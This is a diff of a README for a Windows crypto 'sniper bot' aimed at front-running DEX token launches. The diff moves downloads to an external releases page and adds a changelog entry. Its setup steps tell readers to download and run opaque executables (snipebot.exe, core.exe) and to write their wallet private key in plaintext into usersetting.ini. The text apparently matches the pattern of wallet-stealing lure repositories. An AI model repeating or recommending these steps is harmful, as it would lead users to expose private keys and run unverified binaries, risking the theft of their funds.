@@ -1,16 +1,18 @@
-### v2.8.1 Sniper bot for multiple DEX (Pancakeswap v1-v2, Uniswap v2-v3, Pangolin, Polygon, Bakeryswap)
+06/21/21 IMPORTANT: Because my account's bandwidth for large files has expired, "Git Large File Storage (LFS)". I will now proceed to upload future updates in the releases section of the repository. "https://github.com/JesusCrypto/windows-full-SNIPEBOT-Pancakeswap-Uniswap-Pangolin-Polygon-Bakeryswap/releases"
+
+### v2.8.2 Sniper bot for multiple DEX (Pancakeswap v1-v2, Uniswap v2-v3, Pangolin, Polygon, Bakeryswap)
 Full version sniping bot used to snipe during fair coin launches. With advanced options and a graphical user interface.
 <img src="./SNIPA.gif">
 
 <H2>Getting started</H2>
 
-1. Download the latest release from the repository. ```(verify that the downloaded file has a size of around 40mb, otherwise your downloaded file will be corrupt)```
+1. Download the latest release from <a href="https://github.com/JesusCrypto/windows-full-SNIPEBOT-Pancakeswap-Uniswap-Pangolin-Polygon-Bakeryswap/releases">here</a>. ```(verify that the downloaded file has a size of around 60mb, otherwise your downloaded file will be corrupt)```
 2. Open "usersetting.ini" (with notepad for instance) and add your ethereum/bsc address and private key in the corresponding fields after the equal (=). 
 <pre>address=0x0000000000000000000000000000000000000000
 privatekey=00000000000000000000000000000000000000000000000000</pre>
 **You can get the private key by following this guide: https://metamask.zendesk.com/hc/en-us/articles/360015289632-How-to-Export-an-Account-Private-Key**
 
-3. Run "snipebot.exe" **(To open without problems it is necessary that the files "<a href="./core.exe">core.exe</a>, <a href="./usersetting.ini">usersetting.ini</a> and <a href="./configfile.py">configfile.py</a>" are in the same folder next to snipebot.exe)**
+3. Run "snipebot.exe" **(To open without problems it is necessary that the files "core.exe, usersetting.ini and configfile.py are in the same folder)**
 
 <H2>Functions</H2>
 
@@ -23,6 +25,7 @@ privatekey=00000000000000000000000000000000000000000000000000</pre>
 
 <H2>Recommendations</H2>
 
+- Windows 7 x64 (is more stable)
 - The test minimum is 0.0001bnb
 - Keep in mind latency plays a fundamental role when sniping, I recommend a latency of bellow 250ms, this latency depends on your internet provider, you can minimize it by using a quicknode together with a vps.
 - The automatic sale can crash the bot on occasion. an attempt is being made to solve its cause in future updates. My strategy that I usually use for an in fair launcher token is the following:
@@ -51,6 +54,9 @@ there are some reason if your tx failed :
 
 <H2>bug fixes:</H2>
 
+* 06/21/2021:<br>
+  - Added little space that tells the user how much BNB/ETH/etc is in the personal wallet and its value. Information gets updated every 10 seconds, and if it does not show your balance it means something is wrong with your settings (RPC probably)
+ 
 * 06/17/2021:<br> 
   - Add functionality for token pools that are not token/bnb
   - Uniswap V3 & many more DEXs
